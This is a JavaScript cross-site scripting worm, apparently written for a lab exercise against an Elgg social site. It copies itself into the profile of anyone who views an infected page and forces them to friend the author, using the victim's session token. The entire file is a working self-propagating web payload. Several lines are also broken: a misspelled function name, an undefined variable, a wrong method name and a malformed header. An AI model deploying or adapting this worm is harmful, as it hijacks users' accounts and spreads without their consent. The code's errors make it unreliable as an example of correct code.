// A script to Propegate a worm on social media -- it makes anyone who vies the profile of
// an infected person (except sammy the originator of the worm) friend Sammy and then become infected


<script id = "worm" type = "text/javascript">
window.onload = function() {
	// Getting necessary fields
	var userName="&name="+elgg.session.user.name;
	var guid="&guid="+elgg.session.user.guid;
	var ts = "&__elgg_token="+elgg.security.token.__elgg_token;

	// Propegating the worm
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	wormCode = encodeURICompenent(headerTag + jsCode + tailTag);
	alert(wormCode);

	// Construct the content of the POST request:
	var aboutME = "&description=" + wormCode;
	var bDesc = "&briefdescription=You have been hacked! BE FREE MY WORM!!!!";
	var content = token+ts+userName+aboutME+"&acesslevel[description]=2"+bDesc
	+"&acesslevel[briefdescription]=2&location=&acesslevel[location]=2"
	+"&interests=&acesslevel[interests]=2&skills=&acesslevel[skills]=2"
	+"&contactemail=&acesslevel[contactemail]=2&phone=&acesslevel[phone]=2"
	+"mobile=&acesslevel[mobile]2&website=&acesslevel[website]=2&twitter="
	+"&acesslevel[twitter]=2"+guid;

	var sendurl = "http://www.xsslabelgg.com/action.profile/edit";

	var samyGuid = 47;

	if (elgg.session.user.guid!=samyGuid) {
		// Edit the profile of the victim
		var Ajax = null;
		Ajax = new XMLHttpRequest();
		Ajax.open("POST", sendurl, true);
		Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
		Ajax.sendRequestHeader("Content-Type", "application/x-www.form-urlencoded");
		Ajax.send(content);

		// Friend Sammy
		Ajax = null;
		sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token;
		Ajax = new XMLHttpRequest();
		Ajax.open("GET", sendurl, true);
		Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		Ajax.send()
	}
}
</script>